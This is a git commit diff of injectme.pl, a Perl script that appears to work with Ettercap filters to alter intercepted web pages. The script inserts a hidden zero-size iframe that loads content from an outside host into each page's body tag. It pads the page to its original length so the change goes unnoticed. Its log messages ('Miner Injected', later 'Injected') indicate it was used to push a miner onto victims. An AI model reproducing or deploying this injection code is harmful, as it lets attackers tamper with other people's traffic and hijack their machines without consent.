32d69d34519243a945151d073442f033a77d31ba
root <root@marshall-desktop>
2015-09-12 15:27:22 -0400

    modified:   hashnet.etterfilter 	modified:   injectme.pl 	modified:   nh.ef 	deleted:    test.html 	modified:   tmp/pagedata

--- injectme.pl
+++ injectme.pl
@@ -1,29 +1,31 @@
 #!/usr/bin/perl
-
+# oxagast / Marshall Whittaker
 $inject = '<iframe width=0 height=0 src="http://wtyw.net/lm"></iframe>';
+
 
 while ($a = <>) {
   $c = $c . $a;
-  $chars1 += length($a);
-  if ($a =~ m/<!--.*-->/){
-    $a =~ s/<!--.*-->//g
-  }
-  if ($a =~ /\n/) {
-    $a =~ s/\n//sg
-  }
-  if ($a =~ /\t/) {
-    $a =~ s/\t//sg
-  }
-  if($a =~ m/<body/) {
-    $a =~ s/(<body.*?>)(.*)/\1$inject\2/si;};
-    $b = $b . $a;
-  }
-  $chars2 = length($b);
-  if ($chars1 > $chars2) {
-    $b = $b . " "x($chars1-$chars2);
-    print $b;$date = `date`;
-    chomp($date);
-    print STDERR "[*] $date Miner Injected\n"
-  } if ($chars1 < $chars2) {
-  print $c
+  $b = $b . $a;
+}
+if($b =~ m/<body/i) {
+  $chars1 = length($c);
+  $b =~ s/<!--.*-->//g;
+  $b =~ s/\n//g;
+  $b =~ s/\t//g;
+  $b =~ s/ {2,}/ /;
+  $b =~ s/(<[body|BODY].*?>)(.*)/$1$inject$2/;
+}
+$chars2 = length($b);
+if ($chars1 > $chars2) {
+  $b = $b . " "x($chars1-$chars2);
+  $date = `date`;
+  chomp($date);
+  print STDERR "[*] $date Injected.\n";
+  print $b;
+} 
+if ($chars1 < $chars2) {
+  $date = `date`;
+  chomp($date);
+  print STDERR "[x] $date Injection failed.\n";
+  print $c;
 }
